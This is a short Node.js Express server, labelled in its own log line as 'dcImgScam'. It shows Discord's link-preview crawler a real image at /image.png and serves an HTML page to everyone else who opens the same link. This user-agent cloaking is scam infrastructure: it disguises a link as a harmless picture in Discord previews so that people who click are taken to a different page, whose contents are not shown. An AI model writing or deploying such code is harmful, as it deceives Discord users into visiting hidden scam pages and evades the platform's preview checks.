
// define everything
const express = require('express');
const path = require('path');

const app = express();

// 
app.get('/image.png', (request, response) => {

    if(request.headers['user-agent'].includes('https://discordapp.com')) response.sendFile(path.join(__dirname, '/src/image.png'));
    else response.sendFile(path.join(__dirname, '/src/index.html'));

});


app.listen(2002, async (server) => console.log('[dcImgScam] listening on port 2002!'));
